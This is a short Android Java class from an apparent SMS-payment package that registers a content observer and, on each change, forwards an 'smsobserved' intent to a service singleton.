package com.y7.smspay.mp.re;

import android.content.Intent;
import android.database.ContentObserver;
import android.os.Handler;

import com.y7.smspay.mp.srv.Ms;

public class SsMonOb extends ContentObserver {
	public SsMonOb(Handler handler) {
		super(handler);
	}

	@Override
	public void onChange(boolean selfChange) {
		super.onChange(selfChange);
		Ms.i().onReceive(new Intent("com.ypoy.smsobserved"));
	}
}